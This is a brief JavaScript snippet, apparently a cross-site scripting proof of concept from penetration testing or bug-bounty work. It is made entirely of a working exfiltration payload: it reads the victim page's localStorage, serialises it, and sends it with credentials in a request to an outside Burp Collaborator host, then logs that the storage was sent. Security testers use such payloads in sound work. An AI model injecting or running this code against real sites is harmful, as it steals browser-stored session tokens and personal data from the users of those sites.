var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() { if (xhr.readyState == 4){
console.log("Storage sent: "+JSON.stringify(localStorage));
}}
xhr.open('GET', '//a3egucu8gk0d98yvoxa5j995vw1tpi.burpcollaborator.net/becrop/?data='+JSON.stringify(localStorage),true);
xhr.withCredentials = true;xhr.send(null);

